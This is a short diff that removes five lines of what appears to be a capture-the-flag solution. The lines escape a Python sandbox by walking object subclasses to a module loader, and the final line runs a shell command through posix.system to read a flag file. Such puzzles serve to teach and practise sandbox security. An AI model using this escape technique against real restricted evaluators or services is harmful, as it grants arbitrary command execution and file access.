@@ -1,5 +1,0 @@
-# i(().__class__.__mro__[1].__subclasses__()[111].__subclasses__()[2])
-# i(().__class__.__mro__[1].__subclasses__())
-# i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['_io'])
-# i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").builtin_module_names)
-().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['posix'].system('cat ../flag-15fc2abce04182db0ab63c7c4c478bc3')
